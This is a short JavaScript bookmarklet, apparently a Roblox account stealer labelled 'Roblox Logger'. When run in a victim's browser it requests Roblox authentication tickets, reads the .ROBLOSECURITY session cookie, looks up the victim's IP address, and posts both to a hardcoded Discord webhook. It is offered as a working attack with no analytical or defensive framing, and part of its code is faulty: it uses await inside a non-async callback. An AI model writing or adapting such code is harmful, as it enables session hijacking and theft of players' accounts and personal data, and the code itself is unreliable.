javascript:(function(){
    let webhook = "https://discord.com/api/webhooks/1488315746755805234/mbOYeKyohHeeO1eBMU59K7qo2SAP1whEfnas7edosbBNMhK_Nb8IuNWF4SNDL_9MpgI4";
    
    fetch('https://auth.roblox.com/v1/authentication-ticket', {
        method: 'POST',
        credentials: 'include'
    })
    .then(r => r.json())
    .then(data => {
        return fetch('https://auth.roblox.com/v1/authentication-ticket/redeem', {
            method: 'POST',
            credentials: 'include',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ticket: data.ticket})
        });
    })
    .then(r => r.headers.getSetCookie ? r.headers.getSetCookie() : null)
    .then(cookies => {
        let robloxCookie = document.cookie.split('; ').find(row => row.startsWith('.ROBLOSECURITY'))?.split('=')[1];
        
        fetch(webhook, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({
                username: "Roblox Logger",
                embeds: [{
                    title: "executor",
                    color: 0x00ff00,
                    fields: [
                        {name: "Username", value: "Fetching..."},
                        {name: ".ROBLOSECURITY", value: "```" + (robloxCookie || "Not Found") + "```"},
                        {name: "IP", value: "```" + (await fetch('https://api.ipify.org').then(r=>r.text())) + "```"}
                    ],
                    timestamp: new Date().toISOString()
                }]
            })
        });
    });
})();